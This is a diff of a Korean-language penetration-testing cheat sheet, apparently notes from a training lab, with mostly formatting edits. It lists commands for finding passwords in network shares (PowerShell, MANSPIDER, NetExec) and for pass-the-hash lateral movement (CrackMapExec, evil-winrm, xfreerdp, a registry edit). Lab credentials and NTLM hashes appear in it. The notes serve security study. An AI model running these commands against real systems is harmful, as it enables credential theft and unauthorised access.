@@ -439,7 +439,7 @@ $ ./Pcredz -f ../demo.pcapng -t -v
 ## Credential Hunting in Network Shares
 
 ### PowerShell(Windows)
-````Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern "passw"```<br/>
+```Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern "passw"```
 
 ### Snaffler(Windows)
 - [Snaffler](https://github.com/SnaffCon/Snaffler)는 도메인에 가입된 컴퓨터에서 실행될 때 접근 가능한 네트워크 공유를 자동으로 식별<br/>
@@ -455,12 +455,12 @@ PS> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
 
 ### MANSPIDER(Linux)
 - [MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER)는 도메인에 가입된 컴퓨터에 접근할 수 없거나 원격으로 파일을 검색하고 싶은 경우 사용<br/>
-```$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'```<br/>
+```$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'```
 
 ### NetExec(Linux)
 - `--spider`, `-M spider_plus` 옵션을 사용하여 네트워크 공유를 검색하는데 사용<br/>
 ```$ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"```<br/>
-```$ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' -M spider_plus```<br/>
+```$ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' -M spider_plus```
 
 <br/><br/>
 # 8. Windows Lateral Movement
@@ -485,15 +485,15 @@ PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefre
 
 ### Pass the Hash with CrackMapExec(Linux)
 ```$ crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453```<br/>
-- 로컬 관리자 시도 : ```$ crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth```<br/>
-- 명령 실행 : ```$ crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami```
+로컬 관리자 시도 : ```$ crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth```<br/>
+명령 실행 : ```$ crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami```
 
 ### Pass the Hash with evil-winrm(Linux)
 ```$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453```<br/>
 > 도메인 계정을 사용하는 경우 도메인 이름(예 : administrator@inlanefreight.htb)을 포함해야 함
 
 ### Pass the Hash with RDP(Linux)
-- `Restricted Admin Mode` 활성화 필요
+- `Restricted Admin Mode` 활성화 필요<br/>
 ```c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f```<br/>
 ```$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B```
 
